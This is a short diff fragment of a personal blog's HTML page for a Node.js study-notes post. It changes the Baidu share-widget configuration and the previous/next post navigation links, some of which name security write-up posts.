+                "common":{"bdSnsKey":{},"bdText":"NodeJs学习笔记3　| DoubleR's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -520,15 +502,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/" title="上一篇: SECCON 2018 CTFGhostKingdom Writeup">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/" title="下一篇: Vulhub-ActiveMQ--反序列化漏洞">
+            <a href="/2019/08/28/JavaScript学习笔记5/" title="下一篇: JavaScript学习笔记5">
                 <i class="fa fa-angle-right"></i>
             </a>
         
